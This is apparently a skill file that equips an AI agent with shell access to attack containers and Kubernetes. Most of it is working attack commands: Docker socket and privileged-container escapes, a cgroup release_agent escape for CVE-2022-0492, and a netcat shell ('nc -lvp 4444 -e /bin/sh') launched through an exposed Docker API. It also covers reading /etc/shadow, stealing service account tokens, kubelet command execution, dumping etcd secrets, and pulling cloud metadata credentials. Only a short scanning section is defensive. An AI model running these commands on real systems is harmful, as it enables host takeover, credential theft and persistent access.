---
name: container-security
description: Container and Kubernetes security testing including escape techniques, vulnerability assessment, and cloud-native exploitation
allowed-tools: Bash, Read, Write, Grep, WebFetch
---

# Container Security Skill

## Purpose
Provides comprehensive container and Kubernetes security testing techniques, including container escape methods, vulnerability assessment, and cloud-native exploitation strategies.

## Container Detection

### Identify Container Environment
```bash
# Run comprehensive container detection
scripts/container-security.sh detect

# Manual detection methods
# Check for .dockerenv file
ls -la /.dockerenv

# Check cgroups
cat /proc/1/cgroup | grep -E "docker|kubepods|containerd|crio|lxc"

# Check environment variables
env | grep -E "KUBERNETES|DOCKER|container"

# Check mount points
mount | grep -E "overlay|aufs|docker"

# Check process list
ps aux | grep -E "dockerd|containerd|kubelet"

# Check hostname format
hostname  # Often container ID or pod name

# Check for container-specific files
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
ls -la /run/secrets/ 2>/dev/null
```

## Docker Security

### Docker Enumeration
```bash
# Check Docker version
docker version
docker info

# List containers
docker ps -a
docker container ls

# List images
docker images
docker image ls

# Check Docker socket
ls -la /var/run/docker.sock

# Docker API endpoints
curl --unix-socket /var/run/docker.sock http://localhost/version
curl -X GET http://{target}:2375/version
curl -X GET https://{target}:2376/version
```

### Docker Escape Techniques

#### Privileged Container Escape
```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# If CapEff: 0000003fffffffff = privileged

# Method 1: Mount host filesystem
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host

# Method 2: Direct device access
fdisk -l
mount /dev/sda1 /mnt
cat /mnt/etc/shadow

# Method 3: Load kernel module
insmod /path/to/malicious.ko
```

#### Docker Socket Escape
```bash
# If docker.sock is mounted
ls -la /var/run/docker.sock

# Create privileged container
docker run -v /:/host --privileged -it alpine chroot /host /bin/bash
docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

# Using curl if docker CLI not available
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh"],
    "Mounts": [{
      "Type": "bind",
      "Source": "/",
      "Target": "/host"
    }],
    "Privileged": true
  }' \
  http://localhost/containers/create?name=escape

curl -X POST --unix-socket /var/run/docker.sock \
  http://localhost/containers/escape/start
```

#### CVE-Based Escapes
```bash
# RunC vulnerability (CVE-2019-5736)
# Affects: Docker < 18.09.2, RunC < 1.0-rc6
./runc_exploit

# CVE-2022-0492: cgroup escape
# Affects: Kernel < 5.17
unshare -UrmC bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
echo "$(pwd)/exploit.sh" > /tmp/cgrp/release_agent
echo $$ > /tmp/cgrp/cgroup.procs

# CVE-2024-21626: RunC multiple vulnerabilities
# Check version: runc --version
./cve-2024-21626-exploit.sh
```

### Docker Misconfigurations

#### Exposed Docker API
```bash
# Scan for exposed Docker API
nmap -p 2375,2376 {target}

# Exploit exposed API
docker -H tcp://{target}:2375 ps
docker -H tcp://{target}:2375 run -v /:/host -it alpine chroot /host sh

# Create reverse shell container
docker -H tcp://{target}:2375 run -d -p 4444:4444 alpine \
  sh -c "nc -lvp 4444 -e /bin/sh"
```

#### Insecure Registries
```bash
# Check for insecure registries
docker info | grep -A 5 "Insecure Registries"

# Pull from insecure registry
docker pull {registry}:5000/{image}

# Push malicious image
docker tag malicious {registry}:5000/malicious
docker push {registry}:5000/malicious
```

## Kubernetes Security

### Kubernetes Enumeration
```bash
# Check for Kubernetes environment
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Get API server
env | grep KUBERNETES_SERVICE
kubectl cluster-info

# Enumerate permissions
kubectl auth can-i --list
kubectl auth can-i '*' '*'
kubectl auth can-i create pods

# List resources
kubectl get all --all-namespaces
kubectl get pods
kubectl get services
kubectl get secrets
kubectl get configmaps
kubectl get serviceaccounts
```

### Kubernetes API Exploitation

#### Service Account Token Abuse
```bash
# Set up kubectl with service account
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://kubernetes.default.svc
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Use token with curl
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# Configure kubectl
kubectl config set-cluster k8s --server=$APISERVER --insecure-skip-tls-verify=true
kubectl config set-credentials user --token=$TOKEN
kubectl config set-context k8s --cluster=k8s --user=user
kubectl config use-context k8s
```

#### Pod Escape Techniques
```bash
# Create privileged pod
cat > priv-pod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: priv-pod
spec:
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
EOF
kubectl apply -f priv-pod.yaml
kubectl exec -it priv-pod -- chroot /host bash

# HostNetwork pod
cat > hostnet-pod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: hostnet-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
EOF
kubectl apply -f hostnet-pod.yaml
```

### Kubernetes Vulnerabilities

#### Kubelet API Exploitation
```bash
# Check for exposed kubelet API
curl -k https://{node}:10250/pods
curl -k https://{node}:10255/pods  # Read-only port

# Execute commands via kubelet
curl -k -X POST https://{node}:10250/run/{namespace}/{pod}/{container} \
  -d "cmd=id"

# Get service account tokens
curl -k https://{node}:10250/configz
```

#### ETCD Exploitation
```bash
# Check for exposed ETCD
nmap -p 2379,2380 {target}

# Query ETCD
etcdctl --endpoints=http://{target}:2379 get / --prefix --keys-only
etcdctl --endpoints=http://{target}:2379 get /registry/secrets/default

# Extract secrets
etcdctl get /registry/secrets/default/{secret_name} | \
  sed 's/^.*{/{/' | jq '.data'
```

## Container Registry Security

### Registry Enumeration
```bash
# Docker Hub
curl https://hub.docker.com/v2/repositories/{namespace}/

# Private registry
curl http://{registry}/v2/_catalog
curl http://{registry}/v2/{image}/tags/list
curl http://{registry}/v2/{image}/manifests/{tag}
```

### Registry Exploitation
```bash
# Pull without authentication
docker pull {registry}/{image}:{tag}

# Registry API manipulation
# Delete image
curl -X DELETE http://{registry}/v2/{image}/manifests/{digest}

# Upload malicious image
docker tag malicious {registry}/malicious
docker push {registry}/malicious
```

## Cloud Container Services

### AWS ECS/EKS
```bash
# ECS metadata
curl http://169.254.170.2/v2/metadata
curl http://169.254.170.2/v2/credentials

# EKS IRSA token
cat $AWS_WEB_IDENTITY_TOKEN_FILE
aws sts get-caller-identity

# Enumerate ECS tasks
aws ecs list-tasks --cluster {cluster}
aws ecs describe-tasks --cluster {cluster} --tasks {task_arn}
```

### Azure Container Instances/AKS
```bash
# Azure Instance Metadata
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get access token
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# AKS managed identity
az aks show --resource-group {rg} --name {cluster}
```

### GCP GKE
```bash
# GCP metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Get service account token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# List GKE clusters
gcloud container clusters list
```

## Container Security Scanning

### Image Vulnerability Scanning
```bash
# Trivy
trivy image {image}:{tag}
trivy image --severity HIGH,CRITICAL {image}

# Grype
grype {image}:{tag}

# Docker scan
docker scan {image}:{tag}

# Clair
clair-scanner --ip {host} {image}
```

### Runtime Security
```bash
# Falco - Runtime threat detection
falco -r /etc/falco/falco_rules.yaml

# Sysdig
sysdig container.name={container}

# Check AppArmor/SELinux
docker inspect {container} | grep -E "AppArmorProfile|SelinuxLabel"
```

## Best Practices

1. **Always check for container indicators first**
2. **Test for privileged mode immediately**
3. **Look for mounted sockets and volumes**
4. **Check service account permissions in K8s**
5. **Enumerate before attempting escapes**
6. **Be cautious with kernel exploits in containers**
7. **Document container architecture discovered**

## Integration with Other Skills

### With Linux PrivEsc
```bash
# Many Linux privesc techniques work in containers
# Check for:
- SUID binaries
- Capabilities
- Writable sensitive files
- Kernel vulnerabilities
```

### With Cloud Infrastructure
```bash
# Containers often run in cloud
# Check for:
- Cloud metadata endpoints
- Managed identities
- Cloud-specific container services
```

## Container Security Checklist

```bash
# Run comprehensive security check
scripts/container-security.sh full-audit

# Checklist:
[ ] Container environment detected
[ ] Privileged mode checked
[ ] Docker socket accessibility
[ ] Kubernetes service account reviewed
[ ] Network policies evaluated
[ ] Secrets management assessed
[ ] Image vulnerabilities scanned
[ ] Runtime security monitored
[ ] Escape vectors tested
[ ] Cloud integration reviewed
```

## Notes

- Container escapes can affect host systems
- Always verify container boundaries before exploitation
- Cloud container services have additional attack surfaces
- Keep escape techniques updated as patches are frequent
- Consider container orchestration when planning attacks